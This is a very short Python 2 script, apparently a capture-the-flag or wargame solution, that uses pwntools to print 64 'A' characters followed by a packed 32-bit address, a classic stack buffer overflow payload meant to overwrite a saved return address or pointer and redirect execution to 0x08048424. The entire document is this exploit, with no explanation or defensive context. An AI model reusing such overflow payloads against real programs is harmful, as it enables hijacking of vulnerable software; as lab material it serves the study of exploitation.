#!/usr/bin/python
from pwn import *

addr = p32(0x08048424)

print 'A'*64+addr
